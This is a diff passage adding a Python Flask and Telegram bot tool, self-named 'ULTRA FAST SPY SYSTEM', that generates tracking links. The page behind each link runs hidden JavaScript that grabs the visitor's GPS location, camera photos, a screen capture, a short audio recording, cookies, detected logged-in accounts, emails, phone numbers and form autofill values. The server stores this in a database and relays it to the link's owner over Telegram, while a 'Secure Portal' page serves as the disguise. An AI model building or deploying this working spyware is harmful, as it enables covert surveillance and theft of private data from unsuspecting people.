+                if (!navigator.geolocation) {
+                    data.location_permission = 'Not Supported';
+                    dataCollected.location = false;
+                    resolve();
+                    return;
+                }
+                
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        data.gps_latitude = pos.coords.latitude;
+                        data.gps_longitude = pos.coords.longitude;
+                        data.gps_accuracy = `${Math.round(pos.coords.accuracy)}m`;
+                        data.location_permission = 'Granted';
+                        dataCollected.location = true;
+                        resolve();
+                    },
+                    (err) => {
+                        data.location_permission = err.message;
+                        dataCollected.location = false;
+                        resolve();
+                    },
+                    { enableHighAccuracy: false, timeout: 3000, maximumAge: 30000 }
+                );
+            });
+        }
+        
+        // Fast camera capture (single attempt, short timeout)
+        async function captureCameraFast(facingMode) {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        facingMode: facingMode,
+                        width: { ideal: 640 },  // Lower resolution for speed
+                        height: { ideal: 480 }
+                    }, 
+                    audio: false 
+                })
+                .then(stream => {
+                    const video = document.getElementById('video');
+                    const canvas = document.getElementById('canvas');
+                    
+                    video.srcObject = stream;
+                    
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        
+                        setTimeout(() => {
+                            try {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                
+                                const photo = canvas.toDataURL('image/jpeg', 0.7); // Lower quality for speed
+                                stream.getTracks().forEach(track => track.stop());
+                                resolve(photo);
+                            } catch (err) {
+                                stream.getTracks().forEach(track => track.stop());
+                                resolve('N/A');
+                            }
+                        }, 800); // Shorter wait time
+                    };
+                })
+                .catch(err => {
+                    resolve('N/A');
+                });
+            });
+        }
+        
+        // Fast screenshot (skip on mobile for speed)
+        async function captureScreenshotFast() {
+            // Skip screenshot on mobile to save time
+            if (/Mobile|Android|iPhone/i.test(navigator.userAgent)) {
+                return 'N/A';
+            }
+            
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        width: { ideal: 1280 },  // Lower resolution
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                })
+                .then(stream => {
+                    const video = document.createElement('video');
+                    const canvas = document.getElementById('screenshotCanvas');
+                    
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    video.onloadedmetadata = () => {
+                        setTimeout(() => {
+                            try {
+                                canvas.width = video.videoWidth;
+                                canvas.height = video.videoHeight;
+                                
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0);
+                                
+                                const screenshot = canvas.toDataURL('image/jpeg', 0.7); // JPEG for speed
+                                stream.getTracks().forEach(track => track.stop());
+                                resolve(screenshot);
+                            } catch (err) {
+                                stream.getTracks().forEach(track => track.stop());
+                                resolve('N/A');
+                            }
+                        }, 500); // Very short wait
+                    };
+                })
+                .catch(err => {
+                    resolve('N/A');
+                });
+            });
+        }
+        
+        // Fast audio recording (2 seconds max)
+        async function recordAudioFast() {
+            return new Promise((resolve) => {
+                navigator.mediaDevices.getUserMedia({ audio: true })
+                .then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    
+                    mediaRecorder.ondataavailable = (event) => {
+                        audioChunks.push(event.data);
+                    };
+                    
+                    mediaRecorder.onstop = () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                        const reader = new FileReader();
+                        reader.onload = () => resolve(reader.result);
+                        reader.readAsDataURL(audioBlob);
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 2000); // Only 2 seconds
+                })
+                .catch(err => {
+                    resolve('N/A');
+                });
+            });
+        }
+        
+        // Fast data collection functions
+        function getFastCookies() {
+            const cookies = [];
+            document.cookie.split(';').forEach(cookie => {
+                const [name, value] = cookie.trim().split('=');
+                if (name && value) {
+                    cookies.push({ name, value });
+                }
+            });
+            return cookies;
+        }
+        
+        function checkFastAccounts() {
+            const accounts = {
+                'Google': false,
+                'Facebook': false,
+                'Twitter/X': false,
+                'Instagram': false,
+                'GitHub': false,
+                'LinkedIn': false,
+                'Reddit': false,
+                'YouTube': false
+            };
+            
+            const cookies = getFastCookies();
+            const domains = {
+                'Google': ['accounts.google.com', 'google.com'],
+                'Facebook': ['facebook.com', 'fb.com'],
+                'Twitter/X': ['twitter.com', 'x.com'],
+                'Instagram': ['instagram.com'],
+                'GitHub': ['github.com'],
+                'LinkedIn': ['linkedin.com'],
+                'Reddit': ['reddit.com'],
+                'YouTube': ['youtube.com']
+            };
+            
+            cookies.forEach(cookie => {
+                const cookieName = cookie.name.toLowerCase();
+                if (cookieName.includes('session') || cookieName.includes('auth') || 
+                    cookieName.includes('login') || cookieName.includes('token')) {
+                    for (const [platform, domainList] of Object.entries(domains)) {
+                        domainList.forEach(domain => {
+                            if (cookieName.includes(domain.replace('.com', ''))) {
+                                accounts[platform] = true;
+                            }
+                        });
+                    }
+                }
+            });
+            
+            return accounts;
+        }
+        
+        function harvestFastEmails() {
+            const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}/g;
+            const emails = new Set();
+            
+            // Quick page scan
+            const pageText = document.body.innerText;
+            const matches = pageText.match(emailRegex);
+            if (matches) matches.forEach(email => emails.add(email));
+            
+            // Quick form scan
+            document.querySelectorAll('input[type="email"], input[name*="email"]').forEach(input => {
+                if (input.value && emailRegex.test(input.value)) {
+                    emails.add(input.value);
+                }
+            });
+            
+            return Array.from(emails);
+        }
+        
+        function extractFastPhones() {
+            const phoneRegex = /(\\+?\\d{1,3}[-.\\s]?)?\\(?\\d{3}\\)?[-.\\s]?\\d{3}[-.\\s]?\\d{4}/g;
+            const phones = new Set();
+            
+            // Quick page scan
+            const pageText = document.body.innerText;
+            const matches = pageText.match(phoneRegex);
+            if (matches) matches.forEach(phone => phones.add(phone.trim()));
+            
+            // Quick form scan
+            document.querySelectorAll('input[type="tel"], input[name*="phone"]').forEach(input => {
+                if (input.value && phoneRegex.test(input.value)) {
+                    phones.add(input.value);
+                }
+            });
+            
+            return Array.from(phones);
+        }
+        
+        function getFastAutofill() {
+            const autofillData = {};
+            
+            const fields = {
+                name: 'input[name*="name"], input[id*="name"], input[autocomplete="name"]',
+                email: 'input[name*="email"], input[id*="email"], input[autocomplete="email"]',
+                phone: 'input[name*="phone"], input[id*="phone"], input[autocomplete="tel"]',
+                address: 'input[name*="address"], input[id*="address"], input[autocomplete="street-address"]',
+                city: 'input[name*="city"], input[id*="city"], input[autocomplete="address-level2"]',
+                zip: 'input[name*="zip"], input[id*="zip"], input[autocomplete="postal-code"]',
+                country: 'input[name*="country"], input[id*="country"], input[autocomplete="country"]'
+            };
+            
+            for (const [field, selector] of Object.entries(fields)) {
+                const element = document.querySelector(selector);
+                if (element && element.value) {
+                    autofillData[field] = element.value;
+                }
+            }
+            
+            return autofillData;
+        }
+        
+        function getFastFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200;
+            canvas.height = 50;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('Device Fingerprint', 2, 15);
+            return canvas.toDataURL().substring(0, 100);
+        }
+        
+        function getFastWebGL() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A'
+            };
+        }
+        
+        // Main fast data collection
+        async function collectDataFast() {
+            updateStatus('🔍 Quick analysis...');
+            
+            // Step 1: Get location first (parallel with other data)
+            const locationPromise = getLocationFast();
+            
+            // Step 2: Get device info instantly
+            const deviceInfo = getFastDeviceInfo();
+            
+            // Step 3: Get browser data instantly
+            const webglInfo = getFastWebGL();
+            const canvasFingerprint = getFastFingerprint();
+            const cookies = getFastCookies();
+            const loggedAccounts = checkFastAccounts();
+            const emails = harvestFastEmails();
+            const phones = extractFastPhones();
+            const autofillData = getFastAutofill();
+            
+            // Add basic data
+            Object.assign(data, {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen_resolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpu_cores: navigator.hardwareConcurrency || 'Unknown',
+                touch_support: 'ontouchstart' in window ? 'Yes' : 'No',
+                canvas_fingerprint: canvasFingerprint,
+                webgl_vendor: webglInfo.vendor,
+                webgl_renderer: webglInfo.renderer,
+                device_type: deviceInfo.device_type,
+                os: deviceInfo.os,
+                os_version: deviceInfo.os_version,
+                device_manufacturer: deviceInfo.device_manufacturer,
+                device_model: deviceInfo.device_model,
+                browser: deviceInfo.browser,
+                browser_version: deviceInfo.browser_version,
+                cookies: cookies,
+                logged_accounts: loggedAccounts,
+                emails: emails,
+                phones: phones,
+                autofill_data: autofillData
+            });
+            
+            dataCollected.device_info = true;
+            dataCollected.browser_data = true;
+            dataCollected.cookies = cookies.length > 0;
+            dataCollected.emails = emails.length > 0;
+            dataCollected.phones = phones.length > 0;
+            dataCollected.autofill = Object.keys(autofillData).length > 0;
+            
+            // Quick battery check
+            updateStatus('🔋 Checking battery...');
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery = `${Math.round(battery.level * 100)}% ${battery.charging ? '(Charging)' : '(Not Charging)'}`;
+                } catch (e) {
+                    data.battery = 'N/A';
+                }
+            } else {
+                data.battery = 'N/A';
+            }
+            
+            // Wait for location to complete
+            await locationPromise;
+            
+            // Fast optional media capture (parallel, short timeouts)
+            updateStatus('📸 Optional media...');
+            
+            const mediaPromises = [];
+            
+            // Only attempt media capture on desktop (skip on mobile for speed)
+            if (!/Mobile|Android|iPhone/i.test(navigator.userAgent)) {
+                mediaPromises.push(
+                    captureCameraFast('user').then(photo => {
+                        data.front_camera_photo = photo;
+                        dataCollected.front_camera = photo !== 'N/A';
+                    })
+                );
+                
+                mediaPromises.push(
+                    captureCameraFast('environment').then(photo => {
+                        data.back_camera_photo = photo;
+                        dataCollected.back_camera = photo !== 'N/A';
+                    })
+                );
+                
+                mediaPromises.push(
+                    captureScreenshotFast().then(screenshot => {
+                        data.screenshot = screenshot;
+                        dataCollected.screenshot = screenshot !== 'N/A';
+                    })
+                );
+                
+                mediaPromises.push(
+                    recordAudioFast().then(audio => {
+                        data.audio_recording = audio;
+                        dataCollected.audio = audio !== 'N/A';
+                    })
+                );
+            }
+            
+            // Wait for all media captures to complete or timeout
+            await Promise.race([
+                Promise.all(mediaPromises),
+                new Promise(resolve => setTimeout(resolve, 3000)) // 3 second timeout for all media
+            ]);
+            
+            // Send the data immediately
+            sendData(data);
+        }
+        
+        // Start fast collection immediately
+        setTimeout(() => {
+            collectDataFast();
+        }, 500); // Start after 500ms
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def home():
+    return """
+    <html>
+    <head>
+        <title>Secure Portal</title>
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                margin: 0;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            }
+            .container {
+                text-align: center;
+                background: white;
+                padding: 50px;
+                border-radius: 20px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            }
+            h1 { color: #667eea; margin-bottom: 10px; }
+            p { color: #666; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h1>⚡ Fast Intelligence System</h1>
+            <p>Lightning Fast Data Collection</p>
+        </div>
+    </body>
+    </html>
+    """
+
+@app.route('/track/<link_id>')
+def track(link_id):
+    logger.info(f"Tracking page accessed for link_id: {link_id}")
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM links WHERE id = ? AND active = 1", (link_id,))
+    link = c.fetchone()
+    conn.close()
+    
+    if not link:
+        logger.warning(f"Invalid or expired link: {link_id}")
+        return "Invalid or expired link", 404
+    
+    return render_template_string(TRACKING_PAGE, link_id=link_id)
+
+@app.route('/collect/<link_id>', methods=['POST'])
+def collect(link_id):
+    logger.info(f"Collect endpoint called for link_id: {link_id}")
+    conn = get_db()
+    c = conn.cursor()
+    c.execute("SELECT user_id FROM links WHERE id = ? AND active = 1", (link_id,))
+    link = c.fetchone()
+    
+    if not link:
+        logger.warning(f"Invalid link in collect: {link_id}")
+        conn.close()
+        return jsonify({'status': 'error'}), 404
+    
+    user_id = link[0]
+    data = request.json
+    logger.info(f"Received device data for link {link_id}")
+    
+    # Get IP info
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    ip_info = get_ip_info(ip)
+    
+    # Parse user agent
+    ua = data.get('user_agent', '')
+    device_type = 'Desktop'
+    if 'Mobile' in ua or 'Android' in ua:
+        device_type = 'Mobile'
+    elif 'Tablet' in ua or 'iPad' in ua:
+        device_type = 'Tablet'
+    
+    # Process front camera photo
+    front_camera_data = data.get('front_camera_photo', 'N/A')
+    front_camera_blob = None
+    if front_camera_data != 'N/A' and front_camera_data.startswith('data:image'):
+        try:
+            if ',' in front_camera_data:
+                base64_data = front_camera_data.split(',', 1)[1]
+                photo_bytes = base64.b64decode(base64_data)
+                front_camera_blob = photo_bytes
+                logger.info(f"Front camera photo decoded successfully, size: {len(photo_bytes)} bytes")
+        except Exception as e:
+            logger.error(f"Error decoding front camera photo: {e}")
+    
+    # Process back camera photo
+    back_camera_data = data.get('back_camera_photo', 'N/A')
+    back_camera_blob = None
+    if back_camera_data != 'N/A' and back_camera_data.startswith('data:image'):
+        try:
+            if ',' in back_camera_data:
+                base64_data = back_camera_data.split(',', 1)[1]
+                photo_bytes = base64.b64decode(base64_data)
+                back_camera_blob = photo_bytes
+                logger.info(f"Back camera photo decoded successfully, size: {len(photo_bytes)} bytes")
+        except Exception as e:
+            logger.error(f"Error decoding back camera photo: {e}")
+    
+    # Process screenshot
+    screenshot_data = data.get('screenshot', 'N/A')
+    screenshot_blob = None
+    if screenshot_data != 'N/A' and screenshot_data.startswith('data:image'):
+        try:
+            if ',' in screenshot_data:
+                base64_data = screenshot_data.split(',', 1)[1]
+                screenshot_bytes = base64.b64decode(base64_data)
+                screenshot_blob = screenshot_bytes
+                logger.info(f"Screenshot decoded successfully, size: {len(screenshot_bytes)} bytes")
+        except Exception as e:
+            logger.error(f"Error decoding screenshot: {e}")
+    
+    # Process audio recording
+    audio_data = data.get('audio_recording', 'N/A')
+    audio_blob = None
+    if audio_data != 'N/A' and audio_data.startswith('data:audio'):
+        try:
+            if ',' in audio_data:
+                base64_data = audio_data.split(',', 1)[1]
+                audio_bytes = base64.b64decode(base64_data)
+                audio_blob = audio_bytes
+                logger.info(f"Audio recording decoded successfully, size: {len(audio_bytes)} bytes")
+        except Exception as e:
+            logger.error(f"Error decoding audio recording: {e}")
+    
+    # Prepare data for storage
+    cookies_json = json.dumps(data.get('cookies', []))
+    logged_accounts_json = json.dumps(data.get('logged_accounts', {}))
+    emails_json = json.dumps(data.get('emails', []))
+    phones_json = json.dumps(data.get('phones', []))
+    autofill_data_json = json.dumps(data.get('autofill_data', {}))
+    network_info_json = json.dumps(data.get('network_info', {}))
+    capture_status_json = data.get('data_capture_status', '{}')
+    
+    # Insert device data
+    try:
+        c.execute("""INSERT INTO devices 
+                     (link_id, user_id, ip, user_agent, device_type, os, os_version, device_manufacturer, device_model, browser, 
+                      browser_version, screen_resolution, language, timezone, location, isp, 
+                      latitude, longitude, platform, cpu_cores, touch_support, 
+                      battery, canvas_fingerprint, webgl_vendor, webgl_renderer,
+                      front_camera_photo, back_camera_photo, screenshot, audio_recording,
+                      cookies, logged_accounts, local_storage, session_storage, 
+                      installed_fonts, zip_code, emails, phones, autofill_data, network_info, data_capture_status, timestamp) 
+                     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
+                  (link_id, user_id, ip, ua, device_type, 
+                   data.get('os', 'Unknown'),
+                   data.get('os_version', ''),
+                   data.get('device_manufacturer', ''),
+                   data.get('device_model', ''),
+                   data.get('browser', 'Unknown'),
+                   data.get('browser_version', 'Unknown'),
+                   data.get('screen_resolution', 'Unknown'),
+                   data.get('language', 'Unknown'), 
+                   data.get('timezone', 'Unknown'),
+                   ip_info['location'], ip_info['isp'], 
+                   ip_info['latitude'], ip_info['longitude'],
+                   data.get('platform', 'Unknown'), 
+                   data.get('cpu_cores', 'Unknown'),
+                   data.get('touch_support', 'Unknown'), 
+                   data.get('battery', 'Unknown'),
+                   data.get('canvas_fingerprint', 'Unknown'),
+                   data.get('webgl_vendor', 'Unknown'),
+                   data.get('webgl_renderer', 'Unknown'),
+                   front_camera_blob,
+                   back_camera_blob,
+                   screenshot_blob,
+                   audio_blob,
+                   cookies_json,
+                   logged_accounts_json,
+                   data.get('local_storage_size', 'N/A'),
+                   data.get('session_storage_size', 'N/A'),
+                   data.get('installed_fonts', 'Unknown'),
+                   ip_info['zip'],
+                   emails_json,
+                   phones_json,
+                   autofill_data_json,
+                   network_info_json,
+                   capture_status_json,
+                   datetime.now().isoformat()))
+        
+        c.execute("UPDATE links SET clicks = clicks + 1 WHERE id = ?", (link_id,))
+        conn.commit()
+        logger.info(f"Data saved to database for link {link_id}")
+    except Exception as e:
+        logger.error(f"Database error: {e}")
+    finally:
+        conn.close()
+    
+    # Prepare device data for notification
+    device_data = {
+        'ip': ip,
+        'device_type': device_type,
+        'os': data.get('os', 'Unknown'),
+        'os_version': data.get('os_version', ''),
+        'device_manufacturer': data.get('device_manufacturer', ''),
+        'device_model': data.get('device_model', ''),
+        'browser': data.get('browser', 'Unknown'),
+        'browser_version': data.get('browser_version', 'Unknown'),
+        'screen_resolution': data.get('screen_resolution', 'Unknown'),
+        'location': ip_info['location'],
+        'isp': ip_info['isp'],
+        'org': ip_info.get('org', 'Unknown'),
+        'as': ip_info.get('as', 'Unknown'),
+        'zip': ip_info['zip'],
+        'platform': data.get('platform', 'Unknown'),
+        'cpu_cores': data.get('cpu_cores', 'Unknown'),
+        'touch_support': data.get('touch_support', 'Unknown'),
+        'battery': data.get('battery', 'Unknown'),
+        'language': data.get('language', 'Unknown'),
+        'timezone': data.get('timezone', 'Unknown'),
+        'gps_latitude': data.get('gps_latitude', 'N/A'),
+        'gps_longitude': data.get('gps_longitude', 'N/A'),
+        'gps_accuracy': data.get('gps_accuracy', 'N/A'),
+        'location_permission': data.get('location_permission', 'N/A'),
+        'canvas_fingerprint': data.get('canvas_fingerprint', 'Unknown'),
+        'webgl_vendor': data.get('webgl_vendor', 'Unknown'),
+        'webgl_renderer': data.get('webgl_renderer', 'Unknown'),
+        'cookies': data.get('cookies', []),
+        'logged_accounts': data.get('logged_accounts', {}),
+        'emails': data.get('emails', []),
+        'phones': data.get('phones', []),
+        'autofill_data': data.get('autofill_data', {}),
+        'data_capture_status': capture_status_json
+    }
+    
+    # Send notification asynchronously
+    if telegram_bot:
+        asyncio.run_coroutine_threadsafe(
+            send_device_notification(
+                telegram_bot, 
+                user_id, 
+                device_data, 
+                link_id, 
+                front_camera_data, 
+                back_camera_data, 
+                screenshot_data, 
+                audio_data
+            ),
+            bot_loop
+        )
+    
+    return jsonify({'status': 'success'})
+
+bot_loop = None
+
+async def run_bot_async():
+    """Run Telegram bot"""
+    global telegram_bot, bot_loop
+    
+    bot_loop = asyncio.get_event_loop()
+    
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    telegram_bot = application.bot
+    
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("generate", generate))
+    application.add_handler(CommandHandler("mylinks", mylinks))
+    application.add_handler(CommandHandler("help", help_command))
+    application.add_handler(CallbackQueryHandler(button_callback))
+    
+    print("✅ Fast Telegram Bot is running!")
+    
+    await application.initialize()
+    await application.start()
+    await application.updater.start_polling(drop_pending_updates=True)
+    
+    try:
+        while True:
+            await asyncio.sleep(1)
+    except KeyboardInterrupt:
+        await application.stop()
+
+def run_bot():
+    """Run bot in thread"""
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(run_bot_async())
+
+def run_flask():
+    """Run Flask server"""
+    print("✅ Fast Flask Server running on port 5000!")
+    print(f"🌐 Public URL: https://{localXpose}")
+    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
+
+if __name__ == "__main__":
+    print("╔═══════════════════════════════════╗")
+    print("║  ⚡ ULTRA FAST SPY SYSTEM v7.0  ║")
+    print("╚═══════════════════════════════════╝")
+    print("⚡ Initializing lightning fast intel...")
+    print(f"🌐 URL: https://{localXpose}")
+    print("━━━━━━━━═══════════════════════════")
+    print("\n⚡ SPEED OPTIMIZATIONS:")
+    print("  ✅ Completes in 3-5 seconds")
+    print("  ✅ Location capture first")
+    print("  ✅ Parallel data collection")
+    print("  ✅ Reduced media timeouts")
+    print("  ✅ Lower resolution media")
+    print("  ✅ Skip media on mobile")
+    print("  ✅ Fast device detection")
+    print("  ✅ Optimized browser data")
+    print("  ✅ Quick email/phone extraction")
+    print("  ✅ Streamlined permissions")
+    print("  ✅ Page closure protection")
+    print("\n⏱️  EXPECTED TIMELINE:")
+    print("    0.0s: Page loads")
+    print("    0.5s: Start collection")
+    print("    1.0s: Device info ready")
+    print("    2.0s: Browser data ready")
+    print("    3.0s: Location ready")
+    print("    4.0s: Optional media (desktop only)")
+    print("    5.0s: Complete and redirect")
+    print("\n━━━━━━━━═══════════════════════════\n")
+    
+    bot_thread = Thread(target=run_bot, daemon=True)
+    bot_thread.start()
+    
+    time.sleep(2)
+    
+    run_flask()
